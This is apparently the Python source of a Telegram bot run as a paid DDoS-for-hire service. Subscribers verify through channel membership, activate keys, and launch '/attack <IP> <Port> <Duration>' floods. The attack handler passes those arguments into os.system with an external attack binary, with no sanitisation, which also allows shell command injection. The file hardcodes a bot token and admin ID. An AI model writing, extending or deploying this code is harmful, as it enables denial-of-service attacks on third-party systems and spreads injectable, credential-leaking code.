
import telebot
import logging
import os
import time
import json
from datetime import datetime, timedelta

BOT_TOKEN = "7748076089:AAGuiDwnRgDNvlcwQcegfaeyg-m0jQT6KzQ"
CHANNEL_1 = "https://t.me/+z6aHcdMTRWVkM2Rl"
CHANNEL_2 = "https://t.me/+eYeyzhI24AJhZDk9"
ADMIN_ID = 6830887977
BINARY_COMMAND = "/venompapa"
AUTHORIZED_USERS = "authorized_users.json"

logging.basicConfig(
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

bot = telebot.TeleBot(BOT_TOKEN)

def load_data():
    global authorized_users
    try:
        with open(AUTHORIZED_USERS, "r") as f:
            authorized_users = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        authorized_users = {}

def save_data():
    with open(AUTHORIZED_USERS, "w") as f:
        json.dump(authorized_users, f)


def is_user_authorized(user_id):
  load_data()
  return str(user_id) in authorized_users and authorized_users[str(user_id)].get("is_authorized", False)

def get_user_expiry(user_id):
  load_data()
  if str(user_id) in authorized_users:
    return authorized_users[str(user_id)].get("expiry", None)
  return None

def update_user_expiry(user_id, expiry):
  load_data()
  authorized_users[str(user_id)]["expiry"] = expiry
  save_data()

def authorize_user(user_id, expiry):
  load_data()
  if str(user_id) not in authorized_users:
    authorized_users[str(user_id)] = {}

  authorized_users[str(user_id)]["is_authorized"] = True
  authorized_users[str(user_id)]["expiry"] = expiry
  authorized_users[str(user_id)]["attack_count"] = 0
  save_data()

def increment_attack_count(user_id):
  load_data()
  if str(user_id) in authorized_users:
    authorized_users[str(user_id)]["attack_count"] = authorized_users[str(user_id)].get("attack_count", 0) + 1
    save_data()

def get_attack_count(user_id):
  load_data()
  if str(user_id) in authorized_users:
     return authorized_users[str(user_id)].get("attack_count", 0)
  return 0
def reset_attack_count(user_id):
    load_data()
    if str(user_id) in authorized_users:
      authorized_users[str(user_id)]["attack_count"] = 0
      save_data()


def get_channel_member(user_id, channel_username):
    try:
       member = bot.get_chat_member(chat_id=channel_username, user_id=user_id)
       return member.status in ["member", "administrator", "creator"]
    except Exception as e:
       logger.error(f"Error while verifying user in channel {channel_username} : {e}")
       return False
def is_admin(user_id):
   return user_id == ADMIN_ID


@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    if is_user_authorized(user_id):
       bot.reply_to(message, "Welcome back! Use /help for available commands.")
       return
    bot.reply_to(
        message,
        "Welcome to the bot!\n"
        "To use this bot, join our channels:\n"
        f"- {CHANNEL_1}\n"
        f"- {CHANNEL_2}\n\n"
        "Then, use the `/verify` command to access."
    )


@bot.message_handler(commands=['verify'])
def verify_command(message):
    user_id = message.from_user.id
    if is_user_authorized(user_id):
      bot.reply_to(message, "You are already verified.")
      return

    is_member_channel1 = get_channel_member(user_id, CHANNEL_1)
    is_member_channel2 = get_channel_member(user_id, CHANNEL_2)

    if is_member_channel1 and is_member_channel2:
      bot.reply_to(message, "Verification successful, please use /activatekey to activate subscription or use /help for available commands")
      return
    else:
      bot.reply_to(
        message,
        "To use this bot, join our channels:\n"
        f"- {CHANNEL_1}\n"
        f"- {CHANNEL_2}\n\n"
        "Then, use the `/verify` command to access."
      )


@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    if not is_user_authorized(user_id):
        bot.reply_to(message, "You are not authorized to use this command, please verify your account first.")
        return

    expiry = get_user_expiry(user_id)
    if expiry and expiry < time.time():
       bot.reply_to(message, "Your subscription is expired, please use /activatekey to activate a new subscription.")
       return

    args = message.text.split()[1:]
    if len(args) != 3:
        bot.reply_to(message, "Invalid Arguments.\n Usage: /attack <IP> <Port> <Duration>")
        return

    ip = args[0]
    port = args[1]
    duration = args[2]

    attack_count = get_attack_count(user_id)
    if attack_count >= 3:
      bot.reply_to(message, "You have reached your daily attack limits. Please try again tomorrow.")
      return

    increment_attack_count(user_id)

    if int(duration) > 90:
      bot.reply_to(message, "Maximum attack time is 90 seconds.")
      duration = "90"

    try:
      os.system(f"{BINARY_COMMAND} {ip} {port} {duration}")
      bot.reply_to(message, f"Attack started on {ip}:{port} for {duration} seconds.")
    except Exception as e:
        logger.error(f"Error while running binary command: {e}")
        bot.reply_to(message, "Error while starting attack, please try again later.")


@bot.message_handler(commands=['checkplan'])
def checkplan_command(message):
    user_id = message.from_user.id
    if not is_user_authorized(user_id):
        bot.reply_to(message, "You are not authorized to use this command, please verify your account first.")
        return
    
    expiry = get_user_expiry(user_id)
    if expiry:
      expiry_datetime = datetime.fromtimestamp(expiry)
      bot.reply_to(message, f"Your subscription will expire on: {expiry_datetime}")
    else:
      bot.reply_to(message, "You do not have any active subscriptions.")

@bot.message_handler(commands=['activatekey'])
def activatekey_command(message):
    user_id = message.from_user.id
    args = message.text.split()[1:]
    if len(args) != 1:
       bot.reply_to(message, "Invalid Arguments.\n Usage: /activatekey <key>")
       return

    key = args[0]
    parts = key.split(" ")

    if len(parts) != 3 or parts[1] != "FAITH":
        bot.reply_to(message, "Invalid key format.")
        return
    duration = parts[0]
    custom_text = parts[2]
    try:
        if duration[-1] == "d":
          days = int(duration[:-1])
          expiry = time.time() + (days * 86400)
          authorize_user(user_id, expiry)
          bot.reply_to(message, f"Key activated successfully! You are now authorized to use the bot. Your custom text is {custom_text} and Your subscription will expire on {datetime.fromtimestamp(expiry)}")
        else:
          bot.reply_to(message, "Invalid duration in the key.")
    except ValueError:
          bot.reply_to(message, "Invalid duration in the key.")

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = """
    Available Commands:

    User Commands:
    - /start : Start the bot and initialize your profile
    - /verify : Verify your access to use the bot
    - /attack <IP> <Port> <Duration> : Launch an attack (parameters required)
    - /checkplan : View your subscription details
    - /activatekey <key> : Activate a subscription key
    - /help : Display this help message
    Admin Commands:
    - /setplan <user_id> <duration> <max_duration> : Assign a paid plan to a user
    - /adjustplan <user_id> <time_adjustment> : Adjust the expiration time of a user's plan
    - /generatekey <type> <duration> <max_duration> : Create a subscription key
    - /resetkey <key> <reset/block> : Reset or block a subscription key
    - /resetattacks <user_id> : Reset daily attack limits for a user
    - /maintenance : Toggle maintenance mode for the bot
    - /broadcast <message> : Send a message to all registered users

    Feedback:
    Send a photo or feedback directly in the chat, and it will be forwarded to the admin.

    Note: For more details on specific commands or assistance, contact the admin.
    """
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['setplan'])
def setplan_command(message):
  if not is_admin(message.from_user.id):
    bot.reply_to(message, "You are not authorized to use this command.")
    return
  args = message.text.split()[1:]
  if len(args) != 3:
    bot.reply_to(message, "Invalid Arguments.\n Usage: /setplan <user_id> <duration> <max_duration>")
    return
  user_id = args[0]
  duration = args[1]
  max_duration = args[2]
  bot.reply_to(message, f"Setting plan for user {user_id} with duration: {duration} and max duration: {max_duration}...")

@bot.message_handler(commands=['adjustplan'])
def adjustplan_command(message):
  if not is_admin(message.from_user.id):
    bot.reply_to(message, "You are not authorized to use this command.")
    return
  args = message.text.split()[1:]
  if len(args) != 2:
      bot.reply_to(message, "Invalid Arguments.\n Usage: /adjustplan <user_id> <time_adjustment>")
      return
  user_id = args[0]
  time_adjustment = args[1]
  bot.reply_to(message, f"Adjusting plan for user {user_id} by {time_adjustment}...")

@bot.message_handler(commands=['generatekey'])
def generatekey_command(message):
  if not is_admin(message.from_user.id):
      bot.reply_to(message, "You are not authorized to use this command.")
      return
  args = message.text.split()[1:]
  if len(args) != 3:
     bot.reply_to(message, "Invalid Arguments.\n Usage: /generatekey <type> <duration> <max_duration>")
     return
  key_type = args[0]
  duration = args[1]
  max_duration = args[2]
  bot.reply_to(message, f"Generating key of type: {key_type} with duration: {duration} and max duration: {max_duration}...")

@bot.message_handler(commands=['resetkey'])
def resetkey_command(message):
  if not is_admin(message.from_user.id):
    bot.reply_to(message, "You are not authorized to use this command.")
    return
  args = message.text.split()[1:]
  if len(args) != 2:
     bot.reply_to(message, "Invalid Arguments.\n Usage: /resetkey <key> <reset/block>")
     return
  key = args[0]
  action = args[1]
  bot.reply_to(message, f"Reseting or blocking key {key} with action {action}...")

@bot.message_handler(commands=['resetattacks'])
def resetattacks_command(message):
  if not is_admin(message.from_user.id):
    bot.reply_to(message, "You are not authorized to use this command.")
    return
  args = message.text.split()[1:]
  if len(args) != 1:
    bot.reply_to(message, "Invalid Arguments.\n Usage: /resetattacks <user_id>")
    return
  user_id = args[0]
  reset_attack_count(user_id)
  bot.reply_to(message, f"Reseting attack limits for user {user_id}...")


@bot.message_handler(commands=['maintenance'])
def maintenance_command(message):
  if not is_admin(message.from_user.id):
    bot.reply_to(message, "You are not authorized to use this command.")
    return
  bot.reply_to(message, "Toggling maintenance mode...")


@bot.message_handler(commands=['broadcast'])
def broadcast_command(message):
  if not is_admin(message.from_user.id):
    bot.reply_to(message, "You are not authorized to use this command.")
    return
  args = message.text.split()[1:]
  if not args:
      bot.reply_to(message, "Please provide a message to broadcast.")
      return

  message_text = " ".join(args)
  bot.reply_to(message, f"Broadcasting message: {message_text}")

@bot.message_handler(content_types=['photo', 'text'])
def feedback_handler(message):
  if message.chat.type == "private":
      if message.photo:
        try:
          file_id = message.photo[-1].file_id
          file = bot.get_file(file_id)
          file_path = file.file_path
          bot.send_photo(chat_id=ADMIN_ID, photo=f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}", caption=f"Feedback from user {message.from_user.id} : {message.caption if message.caption else ''}")
        except Exception as e:
          logger.error(f"Error while getting feedback from user: {e}")
          bot.send_message(ADMIN_ID, f"Error while getting feedback: {e} from user: {message.from_user.id}")
      elif message.text:
        try:
          bot.send_message(ADMIN_ID, f"Feedback from user {message.from_user.id} : {message.text}")
        except Exception as e:
          logger.error(f"Error while getting feedback from user: {e}")
          bot.send_message(ADMIN_ID, f"Error while getting feedback: {e} from user: {message.from_user.id}")
      else:
        bot.reply_to(message, "Invalid feedback.")


bot.polling()
        
